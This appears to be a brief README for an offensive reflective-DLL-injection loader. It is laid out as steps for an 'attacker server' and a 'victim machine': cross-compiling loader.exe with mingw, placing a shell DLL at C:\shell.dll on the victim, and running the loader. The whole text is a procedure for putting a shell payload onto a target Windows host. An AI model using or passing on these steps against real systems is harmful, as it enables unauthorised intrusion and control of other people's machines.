# Attacker server
- Prepare dll for loader (https://github.com/stephenfewer/ReflectiveDLLInjection.git)
- build loader by mingw32
```bash
x86_64-w64-mingw32-g++ -o loader.exe loader.cpp -static-libgcc -static-libstdc++
```
# Victim machine
- Download dll and save in C:\shell.dll
```bash
.\loader.exe
```